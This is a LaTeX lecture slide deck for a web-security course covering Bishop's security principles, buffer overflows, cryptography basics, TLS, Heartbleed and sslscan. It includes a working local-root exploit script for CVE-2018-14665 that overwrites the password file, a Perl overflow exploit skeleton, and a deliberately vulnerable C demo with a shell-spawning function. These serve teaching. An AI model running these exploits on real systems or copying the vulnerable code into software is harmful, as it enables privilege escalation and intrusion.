\documentclass[Screen16to9,17pt]{foils}
\usepackage{kea-slides}
\externaldocument{security-in-web-development-exercises}
\selectlanguage{english}

\begin{document}

\mytitlepage
{2. Security Principles, Encryption and Tools}
{Security in Web Development Elective, KEA}


\slide{Summary: Where are we?}

What we have done, so far - short list:
\begin{list2}
\item Meet each other, started working together
\item Started working with a new operating system Linux, a huge task, {\bf mount everest} type of task!
\item Installed 1 or 2 Linux {\bf distributions} -- soo many questions PLUS virtualization software AND networking on top
\item Used multiple tools even though we didn't cover them -- {\bf Ansible, Git, Docker, Python, ...}
\item So many new things - we even ran an advanced portscanner {\bf Nmap} -- which output details, details and a lot of details
\end{list2}

\vskip 6mm
\centerline{\Large It is definitely Okay to feel a bit lost, hence this slide!}

\vskip 6mm
Going into your future work roles, will probably be similar -- you are tasked with something, and have to research and find the solutions.

\slide{Goals for today}

\hlkimage{6cm}{thomas-galler-hZ3uF1-z2Qc-unsplash.jpg}

Todays goals:
\begin{list2}
\item Security Principles what are they
\item See the most simple buffer overflow
\item Get a sense of encryption, know TLS exist
\item Learn some actual useful scanner programs
\end{list2}

{\small   Photo by Thomas Galler on Unsplash}

\slide{Action 1: Security for Web Developers}

Think about a situation where web security has been important or critical.

A small 15 min exercise in a small group 2-3 people where you discuss AND afterwards a few groups are aksed to present -- no presentation slides needed.\\
Questions:

\begin{list2}
\item[1] 2 minutes What is software security in your daily life and work - Hint: use the CIA model\\
Can you remember a situation where you lost confidentiality, integrity or availability?

\item[2] 2 minutes Describe the situation short, maximum 2-3 sentences

\item[3] 10-11 minutes Describe some measures you think would have elminated the problem from appearing or reduced the damage after it happened

\item Example: have you received information about your account, username, email, password etc. has been lost from a web site? What could the company have done differently?

%\item Example: during a project at my studies we lost our report during the writing, even though we had a backup we lost about 8 hours in a critical part of the project. Loss of integrity/availability. We could have done more backup to reduce the work lost
\end{list2}


\slide{Planning action1}

Total 35 minutes, but may be expanded

\begin{list2}
\item 15 minutes in a small group 2-3 people
\item 15 minutes presentation of some cases from the groups
\item 5-10 minute summary
\end{list2}

This is part of my education at KEA as a teacher, to do this and focus on the outcome. Thanks for playing.

\slide{Plan for today}

{~}
\hlkrightpic{8cm}{0cm}{Encrypt_all_the_things.png}

\begin{list1}
\item Subjects
\begin{list2}
\item Security Principles
\item Binary exploitation
\item Basic cryptography - Encryption Decryption - Hashing
\item Poor Use of Cryptography
\item Symmetric Cryptosystems vs  Public Key Cryptography
\end{list2}
\item Exercises
\begin{list2}
\item Demo: Buffer Overflow 101
\item sslscan scan various sites for TLS settings, Qualys SSLLabs
\item Internet scanner programs -- web sites that help identify problems
\end{list2}
\end{list1}


\slide{Reading Summary}

Curriculum:
\begin{list1}
\item RFC5246 The Transport Layer Security (TLS) \link{https://tools.ietf.org/html/rfc5246}\\
Knowing the basics of TLS is curriculum, but you are not expected to read the full\\
RFC, nor explain every detail about TLS!
\end{list1}

Related resources:
\begin{list1}
\item \emph{A Graduate Course in Applied Cryptography} By Dan Boneh and Victor Shoup\\
\link{https://toc.cryptobook.us/} -- download latest PDF
\end{list1}


\slide{Goals: Data Security}

\hlkimage{18cm}{anderson-nine-principles-of-data-security.png}


Source:
\emph{Clinical system security: Interim guidelines}, Ross Anderson, 1996



\slide{Principle of Least Privilege}

\begin{list1}
\item {\bf Definition 14-1} The \emph{principle of least privilege} states that a subject should be given only those privileges that it needs in order to complete the task.
\item Also drop privileges when not needed anymore, relinquish rights immediately
\item Example, need to read a document - but not write.
\item Database systems can often provide very fine grained access to data
\end{list1}

Quote from Matt Bishop, Computer Security

\slide{Principle of Fail-Safe defaults}

\begin{list1}
\item {\bf Definition 14-3} The \emph{principle of fail-safe defaults} states that, unless a subject is given explicit access to an object, it should be denied access to that object.
\item Default access \emph{none}
\item In firewalls default-deny - that which is not allowed is prohibited
\item Newer devices today can come with no administrative users, while older devices often came with default admin/admin users
\item Real world example, OpenSSH config files that come with \verb+PermitRootLogin no+
\end{list1}

Quote from Matt Bishop, Computer Security


\slide{Principle of Economy of Mechanism}

\begin{list1}
\item {\bf Definition 14-4} The \emph{principle of economy of mechanism} states that security mechanisms should be as simple as possible.
\item Simple $->$ fewer complications $->$ fewer security errors
\item Use WPA passphrase instead of MAC address based authentication
\item
\end{list1}

Quote from Matt Bishop, Computer Security


\slide{Principle of Complete Mediation}

\begin{list1}
\item {\bf Definition 14-5} The \emph{principle of complete mediation} requires that all accesses to objects be checked to ensure that they are allowed.
\item Always perform check
\item Time of check, time of use
\item Example Unix file descriptors - access check first, then can be reused in the future
\item Caching can be bad.
\end{list1}

Quote from Matt Bishop, Computer Security


\slide{Principle of Open Design}

\hlkimage{8cm}{debath-stego.png}

Source: picture from \link{https://www.cs.cmu.edu/~dst/DeCSS/Gallery/Stego/index.html}
\begin{list1}
\item {\bf Definition 14-6} The \emph{principle of open design} states that the security of a mechanism should not depend on the secrecy of its design or implementation.
\item Content Scrambling System (CSS) used on DVD movies
\item Mobile data encryption  A5/1 key - see next page
\end{list1}



\slide{Mobile data encryption  A5/1 key}

\begin{quote}
  Real Time Cryptanalysis of A5/1 on a PC
Alex Biryukov * Adi Shamir ** David Wagner ***

  Abstract. A5/1 is the strong version of the encryption algorithm used by about 130 million GSM customers in Europe to protect the over-the-air privacy of their cellular voice and data communication. The best published attacks against it require between 240 and 245 steps. ...
  In this paper we describe new attacks on A5/1, which are based on subtle flaws in the tap structure of the registers, their noninvertible clocking mechanism, and their frequent resets. After a 248 parallelizable data preparation stage (which has to be carried out only once), the actual attacks can be {\bf carried out in real time on a single PC.}

  The first attack requires the output of the A5/1 algorithm during the first two minutes of the conversation, and computes the key in about one second. The second attack requires the output of the A5/1 algorithm during about two seconds of the conversation, and computes the key in several minutes.
  ...
  The approximate design of A5/1 was leaked in 1994, and the exact design of both A5/1 and A5/2 was reverse engineered by Briceno from an actual GSM telephone in 1999 (see [3]).
\end{quote}
Source: \link{http://cryptome.org/a51-bsw.htm}


\slide{Principle of Separation of Privilege}

\hlkimage{3cm}{security-layers-1-uk.pdf}
\begin{list1}
\item {\bf Definition 14-7} The \emph{principle of separation of privilege} states that a system should not grant permission based on a single condition.
\item Company checks, CEO fraud
\item Programs like \emph{su} and \emph{sudo} often requires specific group membership and password
\end{list1}

Quote from Matt Bishop, Computer Security


\slide{Principle of Least Common Mechanism}

\begin{list1}
\item {\bf Definition 14-8} The \emph{principle of least common mechanism} states that mechanisms used to access resources should not be shared.
\item Minimize number of shared mechanisms and resources
\item Also mentions stack protection, randomization
\end{list1}


Quote from Matt Bishop, Computer Security


\slide{Principle of Least Astonishment}

\begin{list1}
\item {\bf Definition 14-9} The \emph{principle of least astonishment} states that security mechanisms should be designed so that users understand the reason that the mechanism works they way it does and that using the mechanism is simple.
\item Security model must be easy to understand and targetted towards users and system administrators
\item Confusion may undermine the security mechanisms
\item Make it easy and as intuitive as possible to use
\item Make output clear, direct and useful\\
Exception user supplies wrong password, tell login failed but not if user or password was wrong
\item Make documentation correct, but the program best
\item Psychological acceptability - should not make resource more difficult to access
\end{list1}

Quote from Matt Bishop, Computer Security


\slide{Technically what is hacking}

\hlkimage{12cm}{buffer-overflow-3.pdf}



\slide{Trinity breaking in}

\hlkimage{14cm}{trinity-nmapscreen-hd-cropscale-418x250.jpg}
Very realistic -- comparable to hacking:\\
\link{https://nmap.org/movies/}\\
\link{https://youtu.be/51lGCTgqE_w}



\slide{Hacking is magic}

\hlkimage{5cm}{wizard_in_blue_hat.png}

\vskip 1 cm

\centerline{Hacking looks like magic}


\slide{Hacking is not magic}

\hlkimage{15cm}{ninjas.png}

\vskip 1 cm
\centerline{Hacking only demands ninja training and knowledge others don't have}



\slide{Buffer overflows a C problem}

\begin{list1}
\item {\bfseries A buffer overflow} is what happens when writing more data than allocated in some area of memory. Typically the program will crash, but under ce
rtain circumstances an attacker can write structures allowing take over of return addresses, parameters for system calls or program execution.
\item {\bfseries Stack protection} is today used as a generic term for multiple technologies used in operating systems, libraries, compilers etc. that protect t
he stack and other structures from being overwritten or changed through buffer overflows. StackGuard
and Propolice are examples of this.
\end{list1}

Today we will not go more into detail about this, suffice it to say modern operating systems really employ a lot of methods for making buffer overflows harder and less likely to succeed. OpenBSD even relink the kernel on installation to randomize addresses.

\slide{Buffers and stacks, simplified}

\hlkimage{18cm}{buffer-overflow-1.pdf}

\begin{minted}[fontsize=\small]{c}
main(int argc, char **argv)
{      char buf[200];
        strcpy(buf, argv[1]);
        printf("%s\n",buf);
}
\end{minted}



\slide{Overflow -- segmentation fault}

\hlkimage{18cm}{buffer-overflow-2.pdf}


\begin{list2}
\item Bad function overwrites return value!
\item Control return address
\item Run shellcode from buffer, or from other place
\end{list2}


\slide{Exploits -- abusing a vulnerability}

\begin{alltt}\footnotesize
$buffer = "";
$null = "\textbackslash{}x00";
$nop = "\textbackslash{}x90";
$nopsize = 1;
$len = 201; // what is needed to overflow, maybe 201, maybe more!
$the_shell_pointer = 0x01101d48; // address where shellcode is
# Fill buffer
for ($i = 1; $i < $len;$i += $nopsize) \{
    $buffer .= $nop;
\}
$address = pack('l', $the_shell_pointer);
$buffer .= $address;
exec "$program", "$buffer";
\end{alltt}

\begin{list2}
\item Exploit/exploit program are designed to exploit a specific vulnerability, often a specific version on a specific release on a specific CPU architecture
\item Might be a 5 line program written in Perl, Python or a C program
\item Today we often see them as modules written for Metasploit allowing it to be combined with different payloads
\end{list2}

\slide{How to find these buffer overflows }

\begin{list1}
\item Black box testing
\item Closed source reverse engineering
\item White box testing
\item Open source read and analyze the code -- tools exist
\item Trial and error -- fuzzing inputs to a program, save crashes, analyze them
\item Reverse engineer specific updates, so this part was changed, nice -- this is where the bug is
\end{list1}


\slide{Principle of Least Privilege}

\begin{list1}
\item Many programs need privileges to perform some function, but sometimes they don't really need it
\item {\bf Definition 14-1} The \emph{principle of least privilege} states that a subject should be given only those privileges that it needs in order to complete the task.\\
Source:  \emph{Computer Security: Art and Science}, 2nd edition, Matt Bishop

\item Also drop privileges when not needed anymore, relinquish rights immediately
\item Example, need to read a document - but not write.
\item Database systems can often provide very fine grained access to data
\end{list1}

\slide{Privilege Escalation}
\begin{list1}
\item {\bfseries Privilege escalation} is when a privileged program is vulnerable and can be abused to escalate privileges. Example from unauthenticated user to a user account, or from regular user and becoming administrator (root on Unix) or even SYSTEM on Windows.
\item Kernels and drivers are also often susceptible to this
\end{list1}


\slide{Local vs. remote exploits}

\begin{list1}
\item {\bfseries Local vs. remote} exploit describe if the attack is done over some network, or locally on a system
\item {\bfseries Remote root exploit}
are the worst kind, since they work over the network, and gives complete control aka root on Unix
\item {\bfseries Zero-day exploits} is a term used for those exploits that suddenly pop up, without previous warning. Often found during incident response at some network. We prefer that security researchers that discover a vulnerability uses a {\bf responsible disclosure} process that involves the vendor .
\end{list1}



\slide{CVE-2018-14665 Multiple Local Privilege Escalation}

\begin{alltt}\footnotesize
#!/bin/sh
# local privilege escalation in X11 currently
# unpatched in OpenBSD 6.4 stable - exploit
# uses cve-2018-14665 to overwrite files as root.
# Impacts Xorg 1.19.0 - 1.20.2 which ships setuid
# and vulnerable in default OpenBSD.
# - https://hacker.house
echo [+] OpenBSD 6.4-stable local root exploit
cd /etc
Xorg -fp 'root:$2b$08$As7rA9IO2lsfSyb7OkESWueQFzgbDfCXw0JXjjYszKa8Aklt5RTSG:0:0:daemon:0:0:Charlie &:/root:/bin/ksh'
 -logfile master.passwd :1 &
sleep 5
pkill Xorg
echo [-] dont forget to mv and chmod /etc/master.passwd.old back
echo [+] type 'Password1' and hit enter for root
su -
\end{alltt}
Code from: \url{https://weeraman.com/x-org-security-vulnerability-cve-2018-14665-f97f9ebe91b3}

\begin{list2}
\item The X.Org project provides an open source implementation of the X Window System. X.Org security advisory: October 25, 2018
\url{https://lists.x.org/archives/xorg-announce/2018-October/002927.html}

%\item Example exploit method, write cron job - wait for shell:\\
%\url{https://www.exploit-db.com/exploits/45742}
\end{list2}



\slide{Zero day 0-day vulnerabilities}

\begin{quote}

  Project Zero's team mission is to "make zero-day hard", i.e. to make it more costly to discover and exploit security vulnerabilities. We primarily achieve this by performing our own security research, but at times we also study external instances of zero-day exploits that were discovered "in the wild". These cases provide an interesting glimpse into real-world attacker behavior and capabilities, in a way that nicely augments the insights we gain from our own research.

  Today, we're sharing our tracking spreadsheet for publicly known cases of detected zero-day exploits, in the hope that this can be a useful community resource:

  Spreadsheet link: 0day "In the Wild"\\
  \link{https://googleprojectzero.blogspot.com/p/0day.html}
\end{quote}

\begin{list2}
\item Not all vulnerabilities are found and reported to the vendors
\item Some vulnerabilities are exploited \emph{in the wild}
\end{list2}

\slide{Demo: Insecure programming buffer overflows 101}


\begin{list2}
\item Small demo program \verb+demo.c+, try on older Linux
\item Has built-in shell code
\item Compile:
\verb+gcc -o demo demo.c+
\item Run program
\verb+./demo test+
\item Goal: Break and insert return address
\end{list2}

\begin{alltt}\small
main(int argc, char **argv)
\{      char buf[10];
        strcpy(buf, argv[1]);
        printf("%s\textbackslash{}n",buf);
\}
the_shell()
\{  system("/bin/sh");  \}
\end{alltt}


\slide{GDB GNU Debugger}

\begin{list1}
\item GNU compileren and debugger are OK for this, can fit on a slide!
\item Lots of other debuggers exist
\item Try \verb+gdb ./demo+ and run the program with some input from the \emph{gdb prompt}
using \verb+run 1234+
\item When you realize the input overflows the buffer, crashed program execution you can work towards getting the address from \verb+nm demo+ of the function \verb+the_shell+
   -- and into the program
\item Use: \verb+nm demo | grep shell+
\item The art is to generate a string long enough to overflow, and having the correct data, so the address ends up in the right place
\item Perl can be used for generating AA...AAA like this, \\
with back ticks, \verb+`perl -e "print 'A'x10"`+
\end{list1}



\slide{Debugging C with GDB}

\begin{list1}
\item Test with input
\begin{list2}
\item \verb+./demo longstringwithalotofdatyacrashtheprogram+
\item \verb+gdb demo+ followed by\\
\verb+run AAAAAAAAAAAAAAAAAAAAAAAAAAAAA+

\item Compile program: \verb+gcc -o demo demo.c+
\item Run program \verb+./demo 123456...7689+ until it dies
\item Then retry in GDB
\end{list2}
\end{list1}


\slide{GDB output}

\begin{alltt}
\small
hlk@bigfoot:demo$ gdb demo
GNU gdb 5.3-20030128 (Apple version gdb-330.1) (Fri Jul 16 21:42:28 GMT 2004)
Copyright 2003 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "powerpc-apple-darwin".
Reading symbols for shared libraries .. done
(gdb) {\bf run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}
Starting program: /Volumes/userdata/projects/security/exploit/demo/demo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Reading symbols for shared libraries . done
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal EXC_BAD_ACCESS, Could not access memory.
{\bf 0x41414140} in ?? ()
(gdb)
\end{alltt}

\slide{GDB output Debian}

\begin{alltt}\footnotesize
hlk@debian:~/demo$ gdb demo
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
...
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from demo...(no debugging symbols found)...done.
(gdb) run `perl -e "print 'A'x24"`
Starting program: /home/hlk/demo/demo `perl -e "print 'A'x24"`
AAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()
(gdb)
\end{alltt}



\exercise{ex:bufferoverflow}





\slide{Basic cryptography}

{~}
\hlkrightpic{9cm}{-1cm}{mitm-2019.png}

\begin{list2}
\item Confidentiality - data ket secret from prying eyes
\item Integrity - data is not changed by unauthorized programs pr people
\item A common attack category is children intercepting messages
\item often called MiTM (Man in the middle) -- Mini in the Middle in this case
\end{list2}



\slide{Basic Cryptography introduction}

\begin{list1}
\item Cryptography or cryptology is the practice and study of techniques for secure communication
\item Modern cryptography is heavily based on mathematical theory and computer science practice; cryptographic algorithms are designed around computational hardness assumptions, making such algorithms hard to break in practice by any adversary
\item Symmetric-key cryptography refers to encryption methods in which both the sender and receiver share the same key, to ensure confidentiality, example algorithm AES
\item Public-key cryptography (like RSA) uses two related keys, a key pair of a public key and a private key. This allows for easier key exchanges, and can provide confidentiality, and methods for signatures and other services
\end{list1}

Source: \link{https://en.wikipedia.org/wiki/Cryptography}

\slide{WEP design major cryptographic errors}

\begin{list1}
\item weak keying - 24 bit already known - 128-bit = 104 bit really
\item small initialisation vector (IV) - only 24 bit, every IV will be reused more often
\item CRC-32 integrity check NOT \emph{strong} enough cryptographically
\item Authentication gives pad - if you get one \emph{encryption pad} for one IV you can produce packets forever
\end{list1}
Source:
\emph{Secure Coding: Principles and Practices}, Mark G. Graff
and Kenneth R. van Wyk, O'Reilly, 2003

Example of a technology that people depended upon, \link{https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy}


\slide{Poor Use of Cryptography}

Common pitfalls
\begin{list2}
\item Creating Your Own Cryptography\\
Its easy to create something you cannot break, but that is not neccessarily secure
\item Choosing the Wrong Cryptography - book recommend FIPS, lots of internet resources recommend NOT to use FIPS! Times changes, follow and read up
\item Relying on Security by Obscurity
\item Hard-Coded Secrets / Mishandling Private Information - if your mobile app binary contains a private key, and is being distributed to millions of users, is it really private - no
\end{list2}

Cryptography is hard! See also the free book:
\begin{list1}
\item \emph{A Graduate Course in Applied Cryptography} By Dan Boneh and Victor Shoup\\
 \url{https://toc.cryptobook.us/}
\end{list1}

\slide{DES, Triple DES og AES}

\hlkimage{15cm}{images/AES_head.png}

\begin{list1}
\item DES encryption - old and retired! Still used as 3DES in Denmark
\item New standard accepted in 2001 Advanced Encryption
  Standard (AES) replacing Data Encryption Standard (DES)
\item Algorithm is Rijndael developed originally byJoan Daemen and Vincent Rijmen.
%\item \emph{Rijndael is available for free. You can use it for
%whatever purposes  you want, irrespective of whether
%it is accepted as AES or not.}
\item See also \link{https://en.wikipedia.org/wiki/Advanced_Encryption_Standard}
\item Animated explainers (with errors) \link{https://www.youtube.com/watch?v=mlzxpkdXP58}
\end{list1}

\slide{AES Advanced Encryption Standard}

\hlkimage{10cm}{aes-overview.png}

\begin{list2}
\item The official Rijndael web site displays this image to promote understanding of the Rijndael round transformation [8].
\item Key sizes 128,192,256 bit typical
\item Some extensions in cryptosystems exist: XTS-AES-256 really is 2 instances of AES-128 and 384 is two instances of AES-192 and 512 is two instances of AES-256
\item \link{https://en.wikipedia.org/wiki/RSA_(cryptosystem)}
\end{list2}


\slide{RSA}

\begin{quote}
RSA (Rivest–Shamir–Adleman) is one of the first public-key cryptosystems and is widely used for secure data transmission. ...
In RSA, this asymmetry is based on the practical difficulty of the factorization of the product of two large prime numbers, the "factoring problem". The acronym RSA is made of the initial letters of the surnames of Ron Rivest, Adi Shamir, and Leonard Adleman, who first publicly described the algorithm in 1978.
\end{quote}

\begin{list2}
\item Key sizes 1,024 to 4,096 bit typical
\item  Quote from: \link{https://en.wikipedia.org/wiki/RSA_(cryptosystem)}
\end{list2}


\slide{Hashing -- message digest functions}

\hlkimage{10cm}{images/message-digest-1.pdf}

\begin{list2}
\item HASH algorithms read input, and output fixed size message \link{https://en.wikipedia.org/wiki/Hash_function}
%\item output fra algoritmerne kaldes ogs<E5> message digest
%\item MD5 er et eksempel p<E5> en meget brugt algoritme
%\item MD5 algoritmen har f<F8>lgende egenskaber:
%  \begin{list2}
%  \item output er 128-bit "fingerprint" uanset l<E6>ngden af input
\item Output values varies a lot even with small input changes -- goal
\item One-way functions -- irreversible
\item Great for integrity protection and password hashing
\item Message Digest (MD5) was described in multiple places and used in RFC-1321: The MD5 Message-Digest
  Algorithm
\item Both MD5 and similar old ones like SHA1 are old and not to be used anymore
\item Newer ones exist, like \link{https://en.wikipedia.org/wiki/PBKDF2} and \link{https://en.wikipedia.org/wiki/Bcrypt}
\end{list2}

\slide{Encryption key length - who are attacking you}

\hlkimage{9cm}{encryption-crack.png}

Source: \link{http://www.mycrypto.net/encryption/encryption_crack.html}

{\small
More up to date:  In 1998, the EFF built Deep Crack for less than \$250,000\\
\link{https://en.wikipedia.org/wiki/EFF_DES_cracker}\\
FPGA Based UNIX Crypt Hardware Password Cracker - ~100 EUR in 2006\\
\link{http://www.sump.org/projects/password/}}


\slide{Diffie Hellman exchange}

{~}
\hlkrightpic{7cm}{-15mm}{800px-Diffie-Hellman_Key_Exchange.png}

\begin{quote}
Diffie–Hellman key exchange (DH)[nb 1] is a method of securely exchanging cryptographic keys over a public channel and was one of the first public-key protocols as originally conceptualized by Ralph Merkle and named after Whitfield Diffie and Martin Hellman.[1][2] DH is one of the earliest practical examples of public key exchange implemented within the field of cryptography.
... The scheme was first published by Whitfield Diffie and Martin Hellman in 1976
\end{quote}

\begin{list2}
\item Quote from: {\small \link{https://en.wikipedia.org/wiki/Diffie-Hellman_key_exchange}}
\item Today we also use elliptic curves with DH \\{\small \link{https://en.wikipedia.org/wiki/Elliptic-curve_cryptography}}
\end{list2}

\slide{Example Weak DH paper}

\hlkimage{13cm}{weakdh-logjam.png}

Source: \link{https://weakdh.org/} and \\
\link{https://weakdh.org/imperfect-forward-secrecy-ccs15.pdf}

Every year in different SSL/TLS implementations there have been problems.

\slide{Other crypto problems like Superfish February 2015}

\hlkimage{12cm}{robert-graham-superfish-cert.png}

Lenovo laptops included Adware, which did SSL/TLS Man in the Middle on connections.
They had a root certificate installed on the Windows operating system, WTF!
Many Anti-Virus tools do the same (stupid things)

{\footnotesize Sources:\\
\link{https://en.wikipedia.org/wiki/Superfish}\\
\link{http://blog.erratasec.com/2015/02/extracting-superfish-certificate.html}\\
\link{http://www.version2.dk/blog/kibana4-superfish-og-emergingthreats-81610}\\
}{\tiny\link{https://www.eff.org/deeplinks/2015/02/further-evidence-lenovo-breaking-https-security-its-laptops}
}


\slide{Elliptic Curve }


\begin{quote}
  Public-key cryptography is based on the intractability of certain mathematical problems. Early public-key systems are secure assuming that it is difficult to factor a large integer composed of two or more large prime factors. For elliptic-curve-based protocols, it is assumed that finding the discrete logarithm of a random elliptic curve element with respect to a publicly known base point is infeasible: this is the {\bf "elliptic curve discrete logarithm problem" (ECDLP)}. The security of elliptic curve cryptography depends on the ability to compute a point multiplication and the inability to compute the multiplicand given the original and product points. The size of the elliptic curve determines the difficulty of the problem.

Elliptic-curve cryptography (ECC) is an approach to public-key cryptography based on the algebraic structure of elliptic curves over finite fields. ECC requires smaller keys compared to non-EC cryptography (based on plain Galois fields) to provide equivalent security.[1]
\end{quote}

\begin{list2}
\item \link{https://en.wikipedia.org/wiki/Elliptic-curve_cryptography}
\item Has very small key sizes
\end{list2}



\slide{Transport Layer Security (TLS)}

\hlkimage{5cm}{crypto-class.png}

\begin{list1}
\item Originally from Netscape Communications Inc.
\item Secure Sockets Layer (SSL) was adopted by the IETF newer versions are called
Transport Layer Security (TLS)
\item TLS 1.0 based on generalized version of SSL Version 3.0
\item RFC-2246 The TLS Protocol Version 1.0 from Januar 1999
\item RFC-3207 SMTP STARTTLS allows the use of TLS with SMTP mail protocols
\item Today most sites and servers support TLS Server Name Indication (SNI) name based certificates
\end{list1}


\slide{TLS Server Name Indication (SNI) example}

\hlkimage{12cm}{wireshark-sni-twitter.png}




\slide{Heartbleed CVE-2014-0160}

\hlkimage{18cm}{heartbleed-com.png}

\centerline{Well-known SSL/TLS exploit}

Source: \link{http://heartbleed.com/}


\slide{Heartbleed hacking}

\begin{alltt}\footnotesize
  06b0: 2D 63 61 63 68 65 0D 0A 43 61 63 68 65 2D 43 6F  -cache..Cache-Co
  06c0: 6E 74 72 6F 6C 3A 20 6E 6F 2D 63 61 63 68 65 0D  ntrol: no-cache.
  06d0: 0A 0D 0A 61 63 74 69 6F 6E 3D 67 63 5F 69 6E 73  ...action=gc_ins
  06e0: 65 72 74 5F 6F 72 64 65 72 26 62 69 6C 6C 6E 6F  ert_order&billno
  06f0: 3D 50 5A 4B 31 31 30 31 26 70 61 79 6D 65 6E 74  =PZK1101&payment
  0700: 5F 69 64 3D 31 26 63 61 72 64 5F 6E 75 6D 62 65  _id=1&card_numbe
  0710: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX   r=4060xxxx413xxx
  0720: 39 36 26 63 61 72 64 5F 65 78 70 5F 6D 6F 6E 74  96&card_exp_mont
  0730: 68 3D 30 32 26 63 61 72 64 5F 65 78 70 5F 79 65  h=02&card_exp_ye
  0740: 61 72 3D 31 37 26 63 61 72 64 5F 63 76 6E 3D 31  ar=17&card_cvn=1
  0750: 30 39 F8 6C 1B E5 72 CA 61 4D 06 4E B3 54 BC DA  09.l..r.aM.N.T..
\end{alltt}

\begin{list2}
\item Obtained using Heartbleed proof of concepts - Gave full credit card details
\item "can XXX be exploited" - yes, clearly! PoCs ARE needed\\
without PoCs even Akamai wouldn't have repaired completely!
\item The internet was ALMOST fooled into thinking getting private keys from Heartbleed was not possible - scary indeed.
\end{list2}

\slide{Key points after heartbleed}

\hlkimage{16cm}{ssl-tls-breaks-timeline.png}
Source: picture source\\ {\footnotesize\link{https://www.duosecurity.com/blog/heartbleed-defense-in-depth-part-2}}
\begin{list2}
\item Writing SSL software and other secure crypto software is hard
\item Configuring SSL is hard\\
check you own site \link{https://www.ssllabs.com/ssltest/}
\item SSL is hard, finding bugs "all the time"
\link{http://armoredbarista.blogspot.dk/2013/01/a-brief-chronology-of-ssltls-attacks.html}
\end{list2}




\slide{SSL/TLS udgaver af protokoller}
\hlkimage{12cm}{imap-ssl.png}

\begin{list1}
\item Many protocols now exist which can use TLS
\item HTTPS vs HTTP
\item IMAPS, POP3S, osv.
\item Some use a different port, some use the START TLS commands
\item I prefer the dedicated ports for encryption -- unencrypted IMAP 143/tcp vs encrypted IMAPS 993/tcp
\end{list1}



\slide{sslscan}

\begin{alltt}\small
root@kali:~# sslscan --ssl2 web.kramse.dk
Version: 1.10.5-static
OpenSSL 1.0.2e-dev xx XXX xxxx

Testing SSL server web.kramse.dk on port 443
...
  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048

Subject:  *.kramse.dk
Altnames: DNS:*.kramse.dk, DNS:kramse.dk
Issuer:   AlphaSSL CA - SHA256 - G2
\end{alltt}

Source:
Originally sslscan from http://www.titania.co.uk
 but use the version on Kali

SSLscan can check your own sites, while Qualys SSLLabs only can test from hostname



\exercise{ex:sslscan}
\exercise{ex:web-site-check}

\exercise{ex:real-vulns-exim}

\exercise{ex:sw-startjuice}
\slidenext{}


\end{document}
